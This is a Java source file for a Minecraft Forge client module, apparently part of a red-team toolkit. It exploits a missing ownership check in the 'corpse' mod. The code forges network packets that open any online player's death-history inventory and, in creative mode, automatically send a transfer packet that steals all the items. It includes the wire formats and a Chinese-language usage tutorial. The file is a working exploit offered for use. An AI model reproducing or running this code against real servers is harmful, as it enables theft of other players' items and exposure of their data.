package com.redblue.red.modules.corpse;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import com.redblue.red.util.ResponseSniffer;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.PlayerInfo;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.*;
import java.util.function.Consumer;

/**
 * CORPSE-01: Arbitrary Player Death History Access + Item Theft
 *
 * Exploits VULN-01 + VULN-03:
 *   MessageShowCorpseInventory (index 2) accepts client-supplied playerUUID + deathID
 *   with zero ownership check. Server opens a history-mode container (stillValid=true always).
 *   If sender is in creative mode, editable=true, enabling transferItems() via
 *   MessageTransferItems (index 4) to steal all items.
 *
 * Wire format (index 2 - MessageShowCorpseInventory):
 *   writeByte(2) + writeLong(playerUUID.msb) + writeLong(playerUUID.lsb)
 *                + writeLong(deathID.msb) + writeLong(deathID.lsb)
 *
 * Wire format (index 3 - MessageRequestDeathHistory):
 *   writeByte(3)   (empty payload, returns sender's own deaths)
 *
 * Wire format (index 4 - MessageTransferItems):
 *   writeByte(4)   (empty payload)
 */
public class CORPSE01_DeathHistorySpy implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("corpse", "default");
    private static final int IDX_SHOW_CORPSE_INVENTORY = 2;
    private static final int IDX_REQUEST_DEATH_HISTORY = 3;
    private static final int IDX_TRANSFER_ITEMS = 4;

    // Dynamic death record options for the ENUM selector
    private volatile String[] deathOptions = { "(未查询)" };
    private final List<ResponseSniffer.DeathRecord> deathRecords = new ArrayList<>();

    private final List<ConfigParam> params;
    private final ConfigParam deathSelector;

    private long lastTick = 0;
    private long pendingTransferAt = -1;

    // Listener for death history responses
    private final Consumer<List<ResponseSniffer.DeathRecord>> deathListener = this::onDeathsReceived;

    public CORPSE01_DeathHistorySpy() {
        deathSelector = ConfigParam.ofEnum("death_select", "选择死亡记录", "(未查询)", deathOptions);

        params = List.of(
            ConfigParam.ofBool("enabled", "启用", false),
            ConfigParam.ofPlayer("target_player", "目标玩家"),
            ConfigParam.ofAction("query_deaths", "查询自己的死亡记录", this::queryOwnDeaths),
            deathSelector,
            ConfigParam.ofString("death_id", "手动输入死亡UUID", ""),
            ConfigParam.ofBool("auto_transfer", "自动转移物品(需创造模式)",
                    "开启后打开GUI同时自动发送TransferItems包窃取物品", false),
            ConfigParam.ofInt("transfer_delay", "转移延迟(tick)", 5, 1, 40),
            ConfigParam.ofInt("interval", "自动间隔(tick)", 20, 1, 200)
        );

        ResponseSniffer.addDeathListener(deathListener);
    }

    @Override public String id() { return "corpse01_death_history_spy"; }
    @Override public String name() { return "死亡记录窥探"; }
    @Override public String description() { return "查看/窃取任意玩家的死亡物品记录"; }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 从「目标玩家」选择器中选择在线玩家(自动获取UUID)\n"
            + "2. 点击「查询自己的死亡记录」可查看自己的死亡历史(演示用)\n"
            + "3. 从「选择死亡记录」中选择具体的死亡事件，或手动输入UUID\n"
            + "4. 点击执行 — 服务端会打开该玩家的死亡物品GUI\n"
            + "5. 如需窃取物品：切换到创造模式，开启「自动转移物品」\n\n"
            + "[参数说明]\n"
            + "目标玩家 — 点击循环选择在线玩家(自动解析UUID)\n"
            + "查询死亡记录 — 发送请求获取自己的死亡历史(服务端限制)\n"
            + "选择死亡记录 — 从查询结果中选择(显示时间和坐标)\n"
            + "手动输入死亡UUID — 直接填写已知的死亡记录UUID\n"
            + "自动转移物品 — 打开GUI后自动发送TransferItems包(需创造模式)\n"
            + "转移延迟 — 打开GUI到发送转移包的等待tick数\n"
            + "自动间隔 — 启用自动模式时的执行间隔";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("corpse");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        sendShowCorpseInventory(mc);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;

        long now = mc.level.getGameTime();

        // Handle pending transfer
        if (pendingTransferAt > 0 && now >= pendingTransferAt) {
            pendingTransferAt = -1;
            sendTransferItems();
        }

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        if (now - lastTick < interval) return;
        lastTick = now;
        sendShowCorpseInventory(mc);
    }

    // ── Core packet methods ─────────────────────────────────────────────

    private void sendShowCorpseInventory(Minecraft mc) {
        UUID targetUUID = resolveTargetUUID(mc);
        UUID deathUUID = resolveDeathUUID();
        if (targetUUID == null || deathUUID == null) return;

        PacketForge.send(CHANNEL, buf -> {
            buf.writeByte(IDX_SHOW_CORPSE_INVENTORY);
            buf.writeLong(targetUUID.getMostSignificantBits());
            buf.writeLong(targetUUID.getLeastSignificantBits());
            buf.writeLong(deathUUID.getMostSignificantBits());
            buf.writeLong(deathUUID.getLeastSignificantBits());
        });

        boolean autoTransfer = getParam("auto_transfer")
                .map(ConfigParam::getBool).orElse(false);
        if (autoTransfer && mc.level != null) {
            int delay = getParam("transfer_delay").map(ConfigParam::getInt).orElse(5);
            pendingTransferAt = mc.level.getGameTime() + delay;
        }
    }

    private void sendTransferItems() {
        PacketForge.send(CHANNEL, buf -> buf.writeByte(IDX_TRANSFER_ITEMS));
    }

    private void queryOwnDeaths() {
        PacketForge.send(CHANNEL, buf -> buf.writeByte(IDX_REQUEST_DEATH_HISTORY));
        Minecraft mc = Minecraft.getInstance();
        if (mc.player != null) {
            mc.player.displayClientMessage(
                net.minecraft.network.chat.Component.literal("\u00a76已发送死亡记录查询请求..."),
                false
            );
        }
    }

    // ── UUID resolution helpers ─────────────────────────────────────────

    /**
     * Resolve target player UUID: first from PLAYER selector (tab list GameProfile),
     * then fall back to manual death_id field's playerUUID if available.
     */
    private UUID resolveTargetUUID(Minecraft mc) {
        String playerName = getParam("target_player").map(ConfigParam::getString).orElse("");
        if (!playerName.isEmpty() && mc.getConnection() != null) {
            for (PlayerInfo info : mc.getConnection().getOnlinePlayers()) {
                if (info.getProfile().getName().equals(playerName)) {
                    return info.getProfile().getId();
                }
            }
        }
        return null;
    }

    /**
     * Resolve death UUID: first from ENUM selector (captured records),
     * then fall back to manual string input.
     */
    private UUID resolveDeathUUID() {
        // Try ENUM selector first
        String selected = getParam("death_select").map(ConfigParam::getString).orElse("");
        if (!selected.isEmpty() && !"(未查询)".equals(selected) && !"(无死亡记录)".equals(selected)) {
            // Find matching record by label
            synchronized (deathRecords) {
                for (ResponseSniffer.DeathRecord rec : deathRecords) {
                    if (rec.shortLabel().equals(selected)) {
                        return rec.id();
                    }
                }
            }
            // Maybe the selected value IS a UUID string
            try { return UUID.fromString(selected); } catch (IllegalArgumentException ignored) {}
        }

        // Fall back to manual input
        String manual = getParam("death_id").map(ConfigParam::getString).orElse("");
        if (!manual.isEmpty()) {
            try { return UUID.fromString(manual); } catch (IllegalArgumentException ignored) {}
        }
        return null;
    }

    // ── Death history response handler ──────────────────────────────────

    private void onDeathsReceived(List<ResponseSniffer.DeathRecord> deaths) {
        synchronized (deathRecords) {
            deathRecords.clear();
            deathRecords.addAll(deaths);
        }

        if (deaths.isEmpty()) {
            deathOptions = new String[]{ "(无死亡记录)" };
        } else {
            deathOptions = deaths.stream()
                    .map(ResponseSniffer.DeathRecord::shortLabel)
                    .toArray(String[]::new);
        }

        // Update the ENUM selector's options array directly and reset selection
        deathSelector.options = deathOptions;
        deathSelector.set(deathOptions[0]);
    }
}
